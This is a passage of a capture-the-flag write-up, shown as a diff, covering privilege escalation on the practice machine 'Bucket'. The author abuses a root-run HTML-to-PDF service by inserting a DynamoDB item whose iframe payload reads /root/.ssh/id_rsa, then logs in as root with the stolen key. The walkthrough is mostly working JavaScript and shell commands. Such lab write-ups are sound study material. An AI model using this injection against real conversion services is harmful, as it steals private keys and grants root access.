@@ -117,3 +117,124 @@ roy:n2v*******:.Aa2
 => Get the user.txt flag in the machine
 
 # Post Exploitation
+So now we have user flag, I did a lot of enumeration with linpeas script, I found that there is a server listening on some port
+```
+netstat -auntp
+
+tcp 	127.0.0.1:8000
+```
+
+I try to request to server and it returns a php page
+```
+curl -v localhost:8000
+
+```
+The PHP page return is similar to the `index.php` in `/var/www/bucket-app` => So we can guess that must be source code of the server is listening on port 8000
+
+```
+head -30 /var/www/bucket-app/index.php
+
+<?php
+require 'vendor/autoload.php';
+use Aws\DynamoDb\DynamoDbClient;
+if($_SERVER["REQUEST_METHOD"]==="POST") {
+        if($_POST["action"]==="get_alerts") {
+                date_default_timezone_set('America/New_York');
+                $client = new DynamoDbClient([
+                        'profile' => 'default',
+                        'region'  => 'us-east-1',
+                        'version' => 'latest',
+                        'endpoint' => 'http://localhost:4566'
+                ]);
+
+                $iterator = $client->getIterator('Scan', array(
+                        'TableName' => 'alerts',
+                        'FilterExpression' => "title = :title",
+                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
+                ));
+
+                foreach ($iterator as $item) {
+                        $name=rand(1,10000).'.html';
+                        file_put_contents('files/'.$name,$item["data"]);
+                }
+                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
+        }
+}
+else
+{
+?>
+
+```
+If we read the code, we will see that it loads DynamoDB javascript client and execute some logic as follow:
+- If request method is POST and `{"action": "get_alerts"}`, it will execute the if statement
+- Init dynamoDB client, scan Table name `alerts`
+- Query filter for `title: Ransomware`
+- In array of `alerts` that have `title: Ransomware`, iw will basically convert `data` field  to `pdf`
+
+`Pd4Cmd` take html as an input, output is a PDF file.
+
+Now from the first query that we did to fetch users credentials from DynamoDB, we notice that there is only one table `users`, there is no table name `alerts`.
+So ... if we create an `alerts` table, and send POST request to the server, the server going to execute those code under `root` priviledge !!.
+
+We navigate back to the dynamoDB web shell in `s3.bucket.htb/shell/` and insert the following code:
+```
+
+createTable = () => {
+    let params = {
+        "TableName": "alerts",
+        "KeySchema": [
+            { AttributeName: "title", KeyType: "HASH" },
+            { AttributeName: "data", KeyType: "RANGE" }
+        ],
+
+        "AttributeDefinitions": [
+            { AttributeName: "title", AttributeType: "S" },
+            { AttributeName: "data", AttributeType: "S" },
+        ],
+
+        "ProvisionedThroughput": {
+            "ReadCapacityUnits": 5,
+            "WriteCapacityUnits": 5
+        }
+    }
+
+    dynamodb.createTable(params, (err, data) => {
+        if (err) console.log(err)
+        else console.log(data)
+    })
+}
+
+createItem = () => {
+    let params = {
+        "TableName": "alerts",
+        "Item": {
+            "title": {
+                S: "Ransomware"
+            },
+            "data": {
+                S: "<html><head></head><body><iframe src='/root/.ssh/id_rsa'></iframe></body></html>"
+            }
+        },
+        "ReturnConsumedCapacity": "TOTAL"
+    }
+    dynamodb.putItem(params, (err, data) => {
+        if (err) console.log(err)
+        else console.log(data)
+    })
+}
+
+
+createTable()
+createItem()
+dynamodb.scan({ "TableName": "alerts" }, (err, data) => {
+    if (err) console.log(err)
+    else console.log(data)
+})
+```
+
+Payload of `data` field is for stealing the root SSH private key.
+Execute it and then inside the machine, we `curl localhost:8000 -d "{\"action\": \"get_alerts\"}"`
+And then after that, we copy `result.pdf` file to our local machine to read root private key
+`scp roy@target://var/www/bucket-app ~`
+
+=> Now we can login as root user with root private key, we can capture the `root.txt` flag.
